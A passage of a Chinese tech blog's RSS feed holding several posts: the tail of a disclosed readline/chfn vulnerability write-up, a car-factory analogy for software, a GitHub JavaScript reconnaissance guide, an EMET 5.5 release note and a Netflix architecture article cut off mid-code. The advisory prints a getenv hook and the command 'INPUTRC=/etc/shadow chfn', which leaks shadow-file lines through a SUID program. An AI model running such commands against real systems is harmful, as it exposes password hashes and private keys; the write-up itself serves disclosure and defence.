&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_real_getenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_real_getenv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;dlsym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RTLD_NEXT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;getenv&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;_real_getenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nf&#34;&gt;syslog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;getenv(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;) =&amp;gt; &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在发现INPUTRC环境变量后，我尝试将其指向/etc/shadow文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ INPUTRC=/etc/shadow chfn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Changing finger information for user.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readline: /etc/shadow: line 9: systemd-journal-remote: unknown key modifier
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Office [b]: ^C
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;根本原因分析&#34;&gt;根本原因分析
&lt;/h2&gt;&lt;p&gt;通过分析readline-8.1源码，发现INPUTRC通过sh_get_env_value传递给getenv。错误信息&amp;quot;unknown key modifier&amp;quot;来自rl_parse_and_bind函数，该函数尝试将输入文件内容解析为键绑定配置时会产生泄露。&lt;/p&gt;
&lt;p&gt;关键漏洞路径有三类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;以引号开头但未闭合的行&lt;/li&gt;
&lt;li&gt;以冒号开头且不含空格的行&lt;/li&gt;
&lt;li&gt;不含空格/制表符/冒号的行&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SSH密钥恰好匹配第三种情况，导致私钥内容被部分泄露。&lt;/p&gt;
&lt;h2 id=&#34;影响范围&#34;&gt;影响范围
&lt;/h2&gt;&lt;p&gt;该漏洞自2017年2.30-rc1版本引入，但主要影响Arch Linux的util-linux包中的chfn程序。其他主流发行版（Debian/Red Hat/Ubuntu）不受影响。&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;p&gt;util-linux维护者已从chfn移除了readline支持。建议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不要在有SUID权限的程序中使用readline&lt;/li&gt;
&lt;li&gt;检查使用ncurses的SUID程序与TERMINFO环境变量的交互&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2017年5月2日：漏洞引入&lt;/li&gt;
&lt;li&gt;2022年2月8日：向Arch和util-linux上游报告&lt;/li&gt;
&lt;li&gt;2022年2月14日：上游修复&lt;/li&gt;
&lt;li&gt;2023年2月16日：公开披露&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>软件开发类比：用造车工厂解释编程原理</title>
        <link>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E7%B1%BB%E6%AF%94%E7%94%A8%E9%80%A0%E8%BD%A6%E5%B7%A5%E5%8E%82%E8%A7%A3%E9%87%8A%E7%BC%96%E7%A8%8B%E5%8E%9F%E7%90%86/</link>
        <pubDate>Sun, 03 Aug 2025 09:12:16 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E7%B1%BB%E6%AF%94%E7%94%A8%E9%80%A0%E8%BD%A6%E5%B7%A5%E5%8E%82%E8%A7%A3%E9%87%8A%E7%BC%96%E7%A8%8B%E5%8E%9F%E7%90%86/</guid>
        <description>&lt;h1 id=&#34;软件开发类比&#34;&gt;软件开发类比
&lt;/h1&gt;&lt;p&gt;作者：Max Kanat-Alexander | 2025年3月7日&lt;/p&gt;
&lt;p&gt;向非技术人员解释软件开发时，我常使用这个类比：想象你运营着一家定制汽车工厂。客户只需在纸上描述想要的汽车，工厂就能自动建造。但这里的关键在于——建造者不是人类，而是只能严格遵循指令的机器人。&lt;/p&gt;
&lt;h2 id=&#34;百万页的汽车建造手册&#34;&gt;百万页的汽车建造手册
&lt;/h2&gt;&lt;p&gt;这些机器人依靠一本百万页的建造手册工作，其中包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个零部件的精确制造步骤&lt;/li&gt;
&lt;li&gt;所有可能的异常情况处理方案（例如机器人故障/材料短缺）&lt;/li&gt;
&lt;li&gt;新型零部件的组合方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;千人协作的持续更新&#34;&gt;千人协作的持续更新
&lt;/h2&gt;&lt;p&gt;1000名工程师共同维护这本手册，他们必须确保：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;所有指令相互兼容（车门必须能匹配车身）&lt;/li&gt;
&lt;li&gt;及时添加新型零部件规范&lt;/li&gt;
&lt;li&gt;修复已发现的问题（例如雨天零件生锈）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;规则系统的重要性&#34;&gt;规则系统的重要性
&lt;/h2&gt;&lt;p&gt;通过制定基础规则（如标准化接口），实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;模块化开发：工程师可独立修改轮毂章节而不影响发动机部分&lt;/li&gt;
&lt;li&gt;系统稳定性：只要遵守规则，局部修改不会导致整车崩溃&lt;/li&gt;
&lt;li&gt;可维护性：新人通过规则体系快速上手&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;与软件开发的对应关系&#34;&gt;与软件开发的对应关系
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;汽车工厂&lt;/th&gt;
          &lt;th&gt;软件开发&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;建造手册&lt;/td&gt;
          &lt;td&gt;代码库&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;机器人&lt;/td&gt;
          &lt;td&gt;编译器/解释器&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;零部件规范&lt;/td&gt;
          &lt;td&gt;API接口设计&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;异常处理方案&lt;/td&gt;
          &lt;td&gt;错误处理机制&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;这个类比可延伸解释：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;技术债务：临时解决方案如同手册中的便签贴，最终需要系统化修正&lt;/li&gt;
&lt;li&gt;代码审查：工程师交叉校验手册内容&lt;/li&gt;
&lt;li&gt;持续集成：每日合并所有作者的修改&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;真正的挑战不在于编写新指令，而在于维护现有指令的协同性。&amp;quot;——这正是软件工程的核心困境&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;通过这个框架，我曾向9岁孩子解释网络安全概念：就像为工厂设置保安系统，既要防止外人篡改手册，又要确保合法工程师能正常协作。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>通过GitHub进行JavaScript侦察：在访问应用前发现敏感信息</title>
        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87github%E8%BF%9B%E8%A1%8Cjavascript%E4%BE%A6%E5%AF%9F%E5%9C%A8%E8%AE%BF%E9%97%AE%E5%BA%94%E7%94%A8%E5%89%8D%E5%8F%91%E7%8E%B0%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</link>
        <pubDate>Sun, 03 Aug 2025 09:01:24 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87github%E8%BF%9B%E8%A1%8Cjavascript%E4%BE%A6%E5%AF%9F%E5%9C%A8%E8%AE%BF%E9%97%AE%E5%BA%94%E7%94%A8%E5%89%8D%E5%8F%91%E7%8E%B0%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</guid>
        <description>&lt;p&gt;“大多数敏感信息并不在前端——它们隐藏在版本控制的坟墓中。”&lt;/p&gt;
&lt;h3 id=&#34;-github为何是js侦察的金矿&#34;&gt;⚡ GitHub为何是JS侦察的金矿
&lt;/h3&gt;&lt;p&gt;现代Web应用通常由庞大的前端JavaScript包驱动——这些文件通过CDN分发、嵌入HTML或由现代框架（React、Vue、Angular）构建。而这些JS文件并非凭空产生。&lt;/p&gt;
&lt;p&gt;它们诞生、演变并在GitHub仓库中被意外错误配置——这正是价值所在。因此，与其从Burp或浏览器开发者工具开始，您可以直接从源头GitHub展开侦察。&lt;/p&gt;
&lt;h3 id=&#34;-在github进行js侦察时的关键目标&#34;&gt;🔍 在GitHub进行JS侦察时的关键目标
&lt;/h3&gt;&lt;h4 id=&#34;1-泄露的内部js文件&#34;&gt;1️⃣ 泄露的内部JS文件
&lt;/h4&gt;&lt;p&gt;重点查找：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;admin.js&lt;/code&gt;, &lt;code&gt;internal.js&lt;/code&gt;, &lt;code&gt;beta.js&lt;/code&gt;, &lt;code&gt;staging.bundle.js&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;debug.js&lt;/code&gt;, &lt;code&gt;test.js&lt;/code&gt;, &lt;code&gt;monitor.js&lt;/code&gt;, &lt;code&gt;analytics.js&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些文件通常包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未在生产环境暴露的内部API路径&lt;/li&gt;
&lt;li&gt;功能开关&lt;/li&gt;
&lt;li&gt;暴露逻辑路径的JS条件语句（例如&lt;code&gt;if (user.isAdmin)&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2-暴露的端点&#34;&gt;2️⃣ 暴露的端点
&lt;/h4&gt;&lt;p&gt;检查以下调用内部：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;axios.get&lt;/code&gt;, &lt;code&gt;fetch()&lt;/code&gt;, &lt;code&gt;$.ajax&lt;/code&gt;, &lt;code&gt;XMLHttpRequest&lt;/code&gt;或自定义&lt;code&gt;apiClient.get&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>EMET 5.5 发布：增强Windows系统安全防护的新利器</title>
        <link>http://localhost:1313/p/emet-5.5-%E5%8F%91%E5%B8%83%E5%A2%9E%E5%BC%BAwindows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E7%9A%84%E6%96%B0%E5%88%A9%E5%99%A8/</link>
        <pubDate>Sun, 03 Aug 2025 08:56:01 +0800</pubDate>
        
        <guid>http://localhost:1313/p/emet-5.5-%E5%8F%91%E5%B8%83%E5%A2%9E%E5%BC%BAwindows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E7%9A%84%E6%96%B0%E5%88%A9%E5%99%A8/</guid>
        <description>&lt;h1 id=&#34;增强缓解体验工具包emet55版本现已发布&#34;&gt;增强缓解体验工具包(EMET)5.5版本现已发布
&lt;/h1&gt;&lt;p&gt;增强缓解体验工具包(EMET)通过预测、转移、终止、阻止或使攻击者常用的入侵技术失效，帮助企业和所有计算机用户防范可能破坏业务和日常生活的安全威胁。这种方式使EMET能在安全更新和反恶意软件正式应对前，就为计算机系统提供针对新型未知威胁的保护。&lt;/p&gt;
&lt;p&gt;今天我们很高兴宣布EMET 5.5的发布，包含以下新功能和更新：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows 10兼容性支持&lt;/li&gt;
&lt;li&gt;通过组策略改进多种缓解措施的配置&lt;/li&gt;
&lt;li&gt;优化缓解措施写入注册表的方式，便于利用现有工具通过组策略管理EMET&lt;/li&gt;
&lt;li&gt;EAF/EAF+伪缓解性能改进&lt;/li&gt;
&lt;li&gt;支持Windows 10中的不受信任字体缓解&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows-10中的缓解措施&#34;&gt;Windows 10中的缓解措施
&lt;/h2&gt;&lt;p&gt;EMET于2009年作为独立工具发布，通过提供管理内置Windows安全缓解措施的界面，并附加干扰常见恶意软件攻击向量的功能，帮助企业更好地保护Windows客户端。随着时间推移，我们对浏览器和核心操作系统的安全性做出了重大改进。在Windows 10中，我们实现了许多可能使EMET变得不必要的功能和缓解措施。EMET在保护旧版系统、遗留应用程序以及为尚未使用控制流防护(CFG)重新编译的第三方软件提供CFG保护方面最为有用。&lt;/p&gt;
&lt;p&gt;Windows 10中提供与EMET相当(或更好)缓解措施的功能包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;设备防护(Device Guard)&lt;/strong&gt;：结合企业级硬件和软件安全功能，将设备锁定为仅可运行受信任的应用程序。为内核模式下的所有软件提供基于硬件的零日防护。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;控制流防护(CFG)&lt;/strong&gt;：在编译新应用时分析每个间接调用指令可达的位置，并在运行时检查每个间接调用的目标是否为预期安全位置。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;应用程序控制(AppLocker)&lt;/strong&gt;：Windows 7引入的应用程序控制功能，可防止组织中运行不需要和未知的应用程序。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;emet-55与edge浏览器&#34;&gt;EMET 5.5与Edge浏览器
&lt;/h2&gt;&lt;p&gt;鉴于Microsoft Edge采用的先进保护技术(包括行业领先的沙盒、编译器和内存管理技术)，EMET 5.5的缓解措施不适用于Edge。&lt;/p&gt;
&lt;p&gt;如需EMET 5.5的使用支持，请访问：https://support.microsoft.com/en-us/kb/2458544&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Netflix如何用Java和微服务架构支撑2.7亿用户</title>
        <link>http://localhost:1313/p/netflix%E5%A6%82%E4%BD%95%E7%94%A8java%E5%92%8C%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E6%94%AF%E6%92%912.7%E4%BA%BF%E7%94%A8%E6%88%B7/</link>
        <pubDate>Sun, 03 Aug 2025 08:45:07 +0800</pubDate>
        
        <guid>http://localhost:1313/p/netflix%E5%A6%82%E4%BD%95%E7%94%A8java%E5%92%8C%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E6%94%AF%E6%92%912.7%E4%BA%BF%E7%94%A8%E6%88%B7/</guid>
        <description>&lt;h1 id=&#34;netflix如何用java和微服务支撑27亿用户&#34;&gt;Netflix如何用Java和微服务支撑2.7亿用户
&lt;/h1&gt;&lt;p&gt;当你在Netflix点击&amp;quot;播放&amp;quot;时，这个操作会触发跨越各大洲、数据中心和数千个微服务的复杂流程。Netflix不仅是流媒体平台，更是服务全球2.7亿用户的分布式工程奇迹。&lt;/p&gt;
&lt;h2 id=&#34;从单体架构到微服务的演进&#34;&gt;从单体架构到微服务的演进
&lt;/h2&gt;&lt;h3 id=&#34;大规模重构&#34;&gt;大规模重构
&lt;/h3&gt;&lt;p&gt;Netflix最初采用单体架构，但随着业务增长，单体架构的维护和扩展变得困难。当数百名开发者同时修改同一代码库时，系统调试和维护逐渐失控。&lt;/p&gt;
&lt;p&gt;向微服务的转型不仅是技术升级，更是生存必需。如今Netflix管理着数千个独立微服务，每个服务负责特定功能。&lt;/p&gt;
&lt;h3 id=&#34;为什么选择java&#34;&gt;为什么选择Java？
&lt;/h3&gt;&lt;p&gt;Netflix选择Java作为主要语言基于四大战略考量：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;可扩展性能&lt;/strong&gt;：JVM的优秀内存管理能力支撑高并发流量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;成熟生态&lt;/strong&gt;：丰富的库和框架避免重复造轮子&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;跨平台性&lt;/strong&gt;：JVM跨环境特性适配AWS和全球数据中心&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;人才储备&lt;/strong&gt;：Java开发者群体庞大便于招聘&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;双平面架构设计&#34;&gt;双平面架构设计
&lt;/h2&gt;&lt;h3 id=&#34;控制平面aws&#34;&gt;控制平面（AWS）
&lt;/h3&gt;&lt;p&gt;&amp;ldquo;播放&amp;quot;前的所有交互由AWS上的Java微服务处理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;推荐引擎&lt;/strong&gt;：ML算法分析观看偏好&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户管理&lt;/strong&gt;：认证、配置文件和偏好设置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内容编目&lt;/strong&gt;：影视元数据存储&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;计费系统&lt;/strong&gt;：支付和订阅管理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数据平面open-connect-cdn&#34;&gt;数据平面（Open Connect CDN）
&lt;/h3&gt;&lt;p&gt;Netflix投入10亿美元自建内容分发网络：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;OCA设备&lt;/strong&gt;：部署在ISP内的物理服务器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;智能缓存&lt;/strong&gt;：ML预测区域热门内容&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;夜间分发&lt;/strong&gt;：利用低峰时段传输数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;自动容错&lt;/strong&gt;：服务器故障时无缝切换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;关键数据&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;全球17,000+服务器&lt;/li&gt;
&lt;li&gt;覆盖165+国家&lt;/li&gt;
&lt;li&gt;95%请求延迟&amp;lt;100ms&lt;/li&gt;
&lt;li&gt;每日PB级数据传输&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;java生态革命性工具&#34;&gt;Java生态革命性工具
&lt;/h2&gt;&lt;h3 id=&#34;hystrix熔断器&#34;&gt;Hystrix熔断器
&lt;/h3&gt;&lt;p&gt;当微服务故障时，Hystrix通过熔断机制防止级联故障。例如推荐服务崩溃时，首页仍能展示通用内容。&lt;/p&gt;
&lt;h3 id=&#34;eureka服务发现&#34;&gt;Eureka服务发现
&lt;/h3&gt;&lt;p&gt;微服务动态注册与发现系统：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;服务启动时自动注册&lt;/li&gt;
&lt;li&gt;通过查询发现依赖服务&lt;/li&gt;
&lt;li&gt;自动负载均衡&lt;/li&gt;
&lt;li&gt;持续健康检查剔除故障实例&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;rxjava响应式编程&#34;&gt;RxJava响应式编程
&lt;/h3&gt;&lt;p&gt;处理异步数据流的典范实现：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Observable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Video&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;videoStream&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;userService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getCurrentUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;flatMap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recommendationService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRecommendations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;flatMap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recommendations&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;videoService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;loadVideo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recommendations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;subscribeOn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Schedulers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;observeOn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AndroidSchedulers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;mainThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
